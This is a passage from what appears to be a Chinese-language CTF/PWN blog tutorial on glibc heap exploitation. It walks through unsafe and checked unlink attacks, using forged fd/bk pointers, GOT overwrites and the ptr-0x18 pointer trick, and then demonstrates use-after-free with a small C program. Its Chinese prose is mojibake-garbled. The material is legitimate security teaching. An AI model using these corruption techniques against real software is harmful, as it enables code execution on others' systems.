operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>   <span class="token comment">//è·å–æ˜¾å¼é“¾è¡¨ä¸­å‰ä¸€ä¸ªå— FD      </span>    BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>   <span class="token comment">//è·å–æ˜¾ç¤ºé“¾è¡¨ä¸­åä¸€ä¸ªå— BK              </span>    FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>  <span class="token comment">//è®¾ç½®FDçš„åä¸€ä¸ªå—      </span>    BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>  <span class="token comment">//è®¾ç½®BKçš„å‰ä¸€ä¸ªå—</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‡è®¾å †å†…å­˜æœ€åˆçš„å¸ƒå±€å¦‚å›¾ï¼ˆ32 ä½ç¨‹åºï¼‰ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A827.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨27.png"></p><p>ä¸Šå›¾ä¸­æœ‰ä¸¤ä¸ªç‰©ç†ç©ºé—´è¿ç»­çš„ <code>chunk</code>ï¼Œåˆ†åˆ«æ˜¯ <code>Q</code> å’Œ <code>Nextchunk</code>ï¼Œå¹¶ä¸” <code>Q</code> å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œ<code>Nextchunk</code> å¤„äºé‡Šæ”¾çŠ¶æ€</p><p>å¦‚æœæˆ‘ä»¬é€šè¿‡æŸç§æ–¹å¼ï¼ˆæ¯”å¦‚ï¼šæº¢å‡ºï¼‰å°† <code>Nextchunk</code> çš„ <code>fd</code> å’Œ <code>bk</code> æŒ‡é’ˆä¿®æ”¹ä¸ºæŒ‡å®šçš„å€¼ï¼Œåˆ™å½“æˆ‘ä»¬ <code>free(Q)</code> æ—¶ï¼Œä¼šå‘ç”Ÿå¦‚ä¸‹æ­¥éª¤ï¼š</p><ol><li>Glibc åˆ¤æ–­ <code>chunk Q</code> æ˜¯ <code>small chunk</code>  </li><li>åˆ¤æ–­å‰å‘åˆå¹¶ï¼Œå‘ç°å‰ä¸€ä¸ª <code>chunk</code> å¤„äºä½¿ç”¨çŠ¶æ€ï¼Œä¸éœ€è¦å‰å‘åˆå¹¶  </li><li>åˆ¤æ–­åå‘åˆå¹¶ï¼Œå‘ç°åä¸€ä¸ª <code>chunk</code> å¤„äºç©ºé—²çŠ¶æ€ï¼Œéœ€è¦åˆå¹¶  </li><li>ç»§è€Œå¯¹ <code>Nextchunk</code> é‡‡å– unlink æ“ä½œ</li></ol><p>æŒ‰ç…§å‰é¢æ‰€æåˆ°çš„ <code>unlink()</code> çš„å¤§è‡´æµç¨‹ï¼Œå¯ä»¥å°†è¯¥è¿‡ç¨‹æ€»ç»“å¦‚ä¸‹ï¼š</p><ol><li><code>FD = P -&gt; fd = target addr - 12</code>  </li><li><code>BK = P -&gt; bk = expect value</code>  </li><li><code>FD -&gt; bk = BK</code>ï¼Œå³ï¼š<code>*(target addr - 12 + 12) = BK = expect value</code>  </li><li><code>BK -&gt; fd = FD</code>ï¼Œå³ï¼š<code>*(expect value + 8) = FD = target addr - 12</code></li></ol><p>è¿™æ ·ä¸€æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ unlink ç›´æ¥å®ç°ä»»æ„åœ°å€è¯»å†™çš„ç›®çš„ï¼Œä½†æ˜¯è¿˜æ˜¯éœ€è¦ç¡®ä¿ <code>expect value + 8</code> çš„åœ°å€å¤„å…·æœ‰å¯å†™çš„æƒé™</p><blockquote><p>ä¾‹å¦‚å°† <code>target addr</code> è®¾ç½®ä¸ºæŸä¸ª GOT è¡¨é¡¹ï¼Œé‚£ä¹ˆå½“ç¨‹åºè°ƒç”¨å¯¹åº”çš„ libc å‡½æ•°æ—¶ï¼Œå°±ä¼šç›´æ¥æ‰§è¡Œæˆ‘ä»¬è®¾ç½®çš„å€¼ <code>expect value</code> å¤„çš„ä»£ç </p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<code>expect value + 8</code> å¤„çš„å€¼è¢«ç ´åäº†ï¼Œéœ€è¦æƒ³åŠæ³•ç»•è¿‡</strong></p></blockquote><hr><h2 id="å­˜åœ¨é˜²æŠ¤çš„-unlink"><a href="#å­˜åœ¨é˜²æŠ¤çš„-unlink" class="headerlink" title="å­˜åœ¨é˜²æŠ¤çš„ unlink"></a>å­˜åœ¨é˜²æŠ¤çš„ unlink</h2><blockquote><p>ç›®å‰çš„ unlink é€šå¸¸æ˜¯å­˜åœ¨æ£€æŸ¥çš„ï¼Œæ­¤æ—¶å°±æ²¡æœ‰é‚£ä¹ˆç®€å•äº†</p></blockquote><p>ç”±äº unlink çš„å±é™©æ€§ï¼ŒGlibc æ·»åŠ äº†ä¸€äº›æ£€æµ‹æœºåˆ¶ï¼Œå­˜åœ¨é˜²æŠ¤çš„ <code>unlink()</code> å®å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Take a chunk off a bin list */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">unlink</span><span class="token expression"><span class="token punctuation">(</span>AV<span class="token punctuation">,</span> P<span class="token punctuation">,</span> BK<span class="token punctuation">,</span> FD<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                            </span><span class="token punctuation">\</span>    <span class="token expression">FD <span class="token operator">=</span> P<span class="token operator">-></span>fd<span class="token punctuation">;</span>      </span><span class="token punctuation">\</span>    <span class="token expression">BK <span class="token operator">=</span> P<span class="token operator">-></span>bk<span class="token punctuation">;</span>      </span></span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \        FD<span class="token operator">-></span>bk <span class="token operator">=</span> BK<span class="token punctuation">;</span>      \        BK<span class="token operator">-></span>fd <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_smallbin_range</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>size<span class="token punctuation">)</span>      \            <span class="token operator">&amp;&amp;</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>      \<span class="token operator">||</span> <span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    \      <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span>      \       <span class="token string">"corrupted double-linked list (not small)"</span><span class="token punctuation">,</span>    \       P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>      \            <span class="token keyword">if</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      \                <span class="token keyword">if</span> <span class="token punctuation">(</span>P<span class="token operator">-></span>fd_nextsize <span class="token operator">==</span> P<span class="token punctuation">)</span>      \                  FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                    FD<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \                    FD<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                    P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> FD<span class="token punctuation">;</span>      \                  <span class="token punctuation">&#125;</span>      \              <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>      \                P<span class="token operator">-></span>fd_nextsize<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>      \                P<span class="token operator">-></span>bk_nextsize<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> P<span class="token operator">-></span>fd_nextsize<span class="token punctuation">;</span>      \              <span class="token punctuation">&#125;</span>      \          <span class="token punctuation">&#125;</span>      \      <span class="token punctuation">&#125;</span>      \<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å…¶ä¸­ï¼Œå¯¹ <code>fd</code> å’Œ <code>bk</code> çš„æ£€æŸ¥ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// fd bk</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>FD<span class="token operator">-></span>bk <span class="token operator">!=</span> P <span class="token operator">||</span> BK<span class="token operator">-></span>fd <span class="token operator">!=</span> P<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span>check_action<span class="token punctuation">,</span> <span class="token string">"corrupted double-linked list"</span><span class="token punctuation">,</span> P<span class="token punctuation">,</span> AV<span class="token punctuation">)</span><span class="token punctuation">;</span>  \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæŒ‰ç…§æ²¡æœ‰é˜²æŠ¤çš„ unlink ä¸­æåˆ°çš„åœºæ™¯ï¼Œå½“å‰ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">FD <span class="token operator">-></span> bk <span class="token operator">=</span> target addr <span class="token operator">-</span> <span class="token number">12</span> <span class="token operator">+</span> <span class="token number">12</span> <span class="token operator">=</span> target addrBK <span class="token operator">-></span> fd <span class="token operator">=</span> expect value <span class="token operator">+</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œä¿®æ”¹ GOT è¡¨é¡¹çš„æ–¹æ³•å¯èƒ½å°±ä¸å¯ç”¨äº†</p><p>ä¸è¿‡ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ªé€ çš„æ–¹å¼ç»•è¿‡è¿™ä¸ªæœºåˆ¶ï¼š</p><p>é¦–å…ˆé€šè¿‡è¦†ç›–ï¼Œå°† <code>Nextchunk</code> çš„ <code>FD</code> æŒ‡é’ˆæŒ‡å‘ <code>fakeFD</code>ï¼Œå°† <code>Nextchunk</code> çš„ <code>BK</code> æŒ‡é’ˆæŒ‡å‘ <code>fakeBK</code></p><p>ä¸ºäº†é€šè¿‡éªŒè¯ï¼Œéœ€è¦æ»¡è¶³ï¼š</p><ul><li><code>fakeFD -&gt; bk == P</code>ï¼Œå³ï¼š<code>*(fakeFD + 12) == P</code></li><li><code>fakeBK -&gt; fd == P</code>ï¼Œå³ï¼š<code>*(fakeBK + 8) == P</code></li></ul><p>å½“æ»¡è¶³ä¸Šè¿°ä¸¤å¼æ—¶ï¼Œå¯ä»¥è¿›å…¥ unlink çš„ç¯èŠ‚ï¼Œè¿›è¡Œå¦‚ä¸‹æ“ä½œï¼š</p><ul><li><code>fakeFD -&gt; bk = fakeBK</code>ï¼Œå³ï¼š<code>*(fakeFD + 12) = fakeBK</code></li><li><code>fakeBK -&gt; fd = fakeFD</code>ï¼Œå³ï¼š<code>*(fakeBK + 8) = fakeFD</code></li></ul><p>å¦‚æœè®© <code>fakeFD + 12</code> å’Œ <code>fakeBK + 8</code> æŒ‡å‘åŒä¸€ä¸ªæŒ‡å‘ P çš„æŒ‡é’ˆï¼Œé‚£ä¹ˆï¼š</p><ul><li><code>*P = P - 8</code></li><li><code>*P = P - 12</code></li></ul><p>é€šè¿‡è¿™ç§æ–¹å¼ï¼ŒP çš„æŒ‡é’ˆæŒ‡å‘äº†æ¯”è‡ªå·±ä½ 12 çš„åœ°å€å¤„</p><blockquote><p>æ­¤æ–¹æ³•è™½ç„¶ä¸å¯ä»¥å®ç°ä»»æ„åœ°å€å†™ï¼Œä½†æ˜¯å¯ä»¥ä¿®æ”¹æŒ‡å‘ <code>chunk</code> çš„æŒ‡é’ˆï¼Œè¿™æ ·çš„ä¿®æ”¹æ˜¯å¯ä»¥è¾¾åˆ°ä¸€å®šçš„æ•ˆæœçš„</p></blockquote><p>å¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿å¾—ä¸¤è€…éƒ½æŒ‡å‘ Pï¼Œåªéœ€è¦æŒ‰ç…§å¦‚ä¸‹æ–¹å¼ä¿®æ”¹å³å¯ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A828.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨28.png"></p><p>ç”±äº P åœ¨ unlink å‰æ˜¯æŒ‡å‘æ­£ç¡®çš„ <code>chunk</code> çš„æŒ‡é’ˆï¼Œå› æ­¤ä¸å—å¦‚ä¸‹æ£€æµ‹çš„å½±å“ï¼š</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// ç”±äºPå·²ç»åœ¨åŒå‘é“¾è¡¨ä¸­ï¼Œæ‰€ä»¥æœ‰ä¸¤ä¸ªåœ°æ–¹è®°å½•å…¶å¤§å°ï¼Œæ‰€ä»¥æ£€æŸ¥ä¸€ä¸‹å…¶å¤§å°æ˜¯å¦ä¸€è‡´ã€‚</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span><span class="token function">chunksize</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token function">prev_size</span> <span class="token punctuation">(</span><span class="token function">next_chunk</span><span class="token punctuation">(</span>P<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>      \  <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"corrupted size vs. prev_size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>               \<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>å¦‚æœæˆ‘ä»¬è®¾ç½® <code>Nextchunk</code> çš„ <code>fd</code> å’Œ <code>bk</code> å‡ä¸º <code>Nextchunk</code> çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥ç»•è¿‡ä¸Šé¢çš„æ£€æµ‹çš„</p><p>ä½†æ˜¯è¿™æ ·ä¸èƒ½è¾¾åˆ°ä¿®æ”¹æŒ‡é’ˆå†…å®¹çš„æ•ˆæœ</p></blockquote><hr><h2 id="åˆ©ç”¨æ€è·¯-1"><a href="#åˆ©ç”¨æ€è·¯-1" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h2><p>åˆ©ç”¨ unlink æ¼æ´çš„æ¡ä»¶ï¼š</p><ol><li>å­˜åœ¨ UAF æ¼æ´ï¼Œå¯ä¿®æ”¹ <code>free</code> çŠ¶æ€ä¸‹ <code>small bin</code> æˆ–æ˜¯ <code>unsorted bin</code> çš„ <code>fd</code> å’Œ <code>bk</code> æŒ‡é’ˆ  </li><li>å·²çŸ¥ä½ç½®å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘å¯è¿›è¡Œ UAF çš„ <code>chunk</code></li></ol><p>å®ç°çš„æ•ˆæœï¼šä½¿å¾—å·²æŒ‡å‘å­˜åœ¨ UAF æ¼æ´çš„ <code>chunk</code> çš„æŒ‡é’ˆ <code>ptr</code> å˜ä¸º <code>ptr - 0x18</code></p><p>å‡è®¾æŒ‡å‘å­˜åœ¨ UAF æ¼æ´çš„ <code>chunk</code> çš„æŒ‡é’ˆçš„åœ°å€ä¸º <code>ptr</code>ï¼Œåˆ™å®ç°çš„ä¸»è¦æ­¥éª¤ä¸ºï¼š</p><ol><li>ä¿®æ”¹ <code>fd</code> ä¸º <code>ptr - 0x18</code>  </li><li>ä¿®æ”¹ <code>bk</code> ä¸º <code>ptr - 0x10</code>  </li><li>è§¦å‘ unlinkï¼Œ<code>ptr</code> å¤„çš„æŒ‡é’ˆä¼šå˜ä¸º <code>ptr - 0x18</code></li></ol><hr><h1 id="Use-After-Free"><a href="#Use-After-Free" class="headerlink" title="Use After Free"></a>Use After Free</h1><blockquote><p>Use After Free ç®€ç§° UAFï¼Œå³ï¼šé‡Šæ”¾åä½¿ç”¨æ¼æ´ï¼ŒæŒ‡ä¸€ä¸ªå†…å­˜å—è¢«é‡Šæ”¾ä¹‹åå†æ¬¡è¢«ä½¿ç”¨</p></blockquote><p>å¯¹äºå†…å­˜å—é‡Šæ”¾ä¹‹åçš„æ“ä½œï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ol><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆè¢«è®¾ç½®ä¸º NULL</strong>ï¼Œç„¶åå†æ¬¡ä½¿ç”¨ï¼Œè‡ªç„¶ç¨‹åºä¼šå´©æºƒ  </p></li><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</strong>ï¼Œç„¶ååœ¨å®ƒä¸‹ä¸€æ¬¡è¢«ä½¿ç”¨ä¹‹å‰ï¼Œ<em>æ²¡æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œä¿®æ”¹</em>ï¼Œé‚£ä¹ˆç¨‹åºå¾ˆæœ‰å¯èƒ½å¯ä»¥æ­£å¸¸è¿è½¬  </p></li><li><p><strong>å†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</strong>ï¼Œä½†æ˜¯åœ¨å®ƒä¸‹ä¸€æ¬¡ä½¿ç”¨ä¹‹å‰ï¼Œ<em>æœ‰ä»£ç å¯¹è¿™å—å†…å­˜å—è¿›è¡Œäº†ä¿®æ”¹</em>ï¼Œé‚£ä¹ˆå½“ç¨‹åºå†æ¬¡ä½¿ç”¨è¿™å—å†…å­˜æ—¶ï¼Œå°±å¾ˆæœ‰å¯èƒ½ä¼šå‡ºç°å¥‡æ€ªçš„é—®é¢˜</p></li></ol><p>é€šå¸¸æˆ‘ä»¬æ‰€è¯´çš„ UAF æ¼æ´å¯¹åº”çš„å°±æ˜¯ 2 å’Œ 3</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œ<em>UAF æ¼æ´åˆ©ç”¨çš„å‰ææ˜¯ï¼šå†…å­˜å—è¢«é‡Šæ”¾åï¼Œå…¶å¯¹åº”çš„æŒ‡é’ˆæ²¡æœ‰è¢«è®¾ç½®ä¸º NULL</em></p><p>ç¤ºä¾‹ï¼šï¼ˆ64 ä½ç¨‹åºï¼‰</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">name</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>myname<span class="token punctuation">;</span>  <span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>func<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> NAME<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">myprint</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s\n"</span><span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">printmyname</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"call print my name\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  NAME <span class="token operator">*</span>a<span class="token punctuation">;</span>  a <span class="token operator">=</span> <span class="token punctuation">(</span>NAME <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> myprint<span class="token punctuation">;</span>  a <span class="token operator">-></span> myname <span class="token operator">=</span> <span class="token string">"I can also use it"</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">free</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free without modify</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"I can also use it"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// free with modify</span>  a <span class="token operator">-></span> func <span class="token operator">=</span> printmyname<span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"this is my function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// set NULL</span>  a <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"this pogram will crash...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  a <span class="token operator">-></span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token string">"can not be printed..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿è¡Œç»“æœï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A829.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨29.png"></p><ul><li><p>å³ä½¿ <code>free</code> æ‰äº† <code>chunk a</code>ï¼Œæˆ‘ä»¬ä¾ç„¶å¯ä»¥é€šè¿‡ <code>a -&gt; func(&quot;I can also use it&quot;)</code> è°ƒç”¨ <code>myprint()</code> æ‰“å°è¾“å‡º  </p></li><li><p>å³ä½¿ <code>free</code> æ‰äº† <code>chunk a</code>ï¼Œå°† <code>a -&gt; func</code> ä¿®æ”¹ä¸º <code>printmyname()</code>ï¼Œä¹Ÿå¯ä»¥æ­£å¸¸ä½¿ç”¨ <code>printf(&quot;call print my name\n&quot;)</code> åŠŸèƒ½</p></li><li><p>ä½†æ˜¯å½“ <code>chunk a</code> è¢«ç½®ä¸º NULL åï¼Œ<code>a -&gt; func(&quot;can not be printed...&quot;)</code> ä¾¿æ— æ³•ä½¿ç”¨</p></li></ul><p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é€šè¿‡ GDB è°ƒè¯•åˆ†æä¸€ä¸‹æ•´ä¸ªè¿‡ç¨‹</p><p>åœ¨æ‰§è¡Œ <code>free(a)</code> ä¹‹å‰ï¼Œå †å¸ƒå±€å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A830.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨30.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A831.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨31.png"></p><p>æ‰§è¡Œ <code>free(a)</code> åï¼Œ<code>chunk a</code> è¢«ç½®äº <code>fast bin</code> ä¸­</p><p><strong><code>myname</code> æŒ‡é’ˆè¢«ç½®ä¸º NULLï¼Œä½† <code>func</code> æŒ‡é’ˆæœªå‘ç”Ÿå˜åŒ–</strong>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A832.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨32.png"></p><p>æ­¤æ—¶é€šè¿‡ <code>a -&gt; func(&quot;I can also use it&quot;)</code> ä¾ç„¶å¯ä»¥è°ƒç”¨ <code>myprint()</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A833.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨33.png"></p><p>å½“æˆ‘ä»¬å°† <code>func</code> æŒ‡é’ˆä¿®æ”¹ä¸º <code>printmyname()</code> åï¼Œé€šè¿‡ <code>a -&gt; func(&quot;this is my function&quot;)</code> ä¹Ÿå¯ä»¥è°ƒç”¨ <code>printmyname()</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A834.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨34.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E7%9B%B8%E5%85%B3%E7%9A%84%E6%BC%8F%E6%B4%9E%E4%B8%8E%E5%88%A9%E7%94%A835.png" alt="CTF - PWN_å †ç›¸å…³çš„æ¼æ´ä¸åˆ©ç”¨35.png"></p><p>å½“æˆ‘ä»¬é€šè¿‡ <code>a = NULL</code> å°†å…¶ç½®ä¸º NULL 